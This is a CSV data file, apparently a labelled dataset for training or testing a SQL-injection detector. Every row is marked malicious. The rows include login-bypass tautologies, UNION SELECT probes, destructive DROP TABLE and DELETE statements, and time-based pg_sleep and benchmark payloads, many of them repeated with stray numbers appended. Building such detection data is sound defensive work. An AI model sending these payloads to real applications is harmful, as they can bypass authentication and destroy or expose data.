payload,label
1; DELETE FROM items,1
admin' OR '1'='1,1
pg_sleep(10),1
"benchmark(10000000,MD5(1)) 27",1
DROP TABLE users,1
pg_sleep(10) 32,1
' OR 'a'='a,1
"benchmark(10000000,md5(1))",1
SELECT * FROM 50,1
admin' or '1'='1,1
1; delete from items,1
' or 1=1 #,1
select * from,1
SELECT * FROM 35,1
admin' or '1'='1 68,1
' or 1=1 #,1
"benchmark(10000000,md5(1))",1
' OR '1'='1' -- 35,1
drop table users,1
select * from 22,1
admin'/*,1
SELECT * FROM,1
1; DELETE FROM items,1
select * from,1
' OR 1=1 --,1
admin'/*,1
SELECT * FROM,1
drop table users,1
SELECT * FROM,1
admin'/*,1
admin'/*,1
select * from 2,1
drop table users 46,1
drop table users,1
' or 1=1 #,1
1; DELETE FROM items,1
' or 1=1 #,1
DROP TABLE users,1
SELECT * FROM,1
union select,1
admin'/* 67,1
' OR 1=1 --,1
admin'/*,1
1; DELETE FROM items,1
UNION SELECT,1
admin' --,1
"benchmark(10000000,MD5(1)) 65",1
SELECT * FROM,1
admin' -- 5,1
SELECT * FROM,1
select * from,1
admin' OR '1'='1 92,1
select * from,1
union select,1
admin' or '1'='1 49,1
drop table users,1
' OR '1'='1' -- 25,1
drop table users,1
admin' -- 81,1
' OR 1=1 -- 52,1
' OR 1=1 #,1
admin'/*,1
' or 1=1 -- 5,1
' or 1=1 --,1
' OR '1'='1' --,1
union select,1
"benchmark(10000000,md5(1)) 50",1
admin' or '1'='1,1
' OR 'a'='a,1
' or 1=1 #,1
pg_sleep(10) 90,1
admin' or '1'='1,1
' OR 1=1 # 100,1
1; delete from items,1
1; DELETE FROM items,1
UNION SELECT,1
' or 1=1 #,1
admin' --,1
DROP TABLE users,1
select * from,1
' or 1=1 --,1
UNION SELECT 66,1
' OR 1=1 --,1
pg_sleep(10),1
SELECT * FROM 98,1
' OR 1=1 #,1
union select,1
SELECT * FROM,1
1; DELETE FROM items 42,1
admin' OR '1'='1,1
' or '1'='1' --,1
pg_sleep(10),1
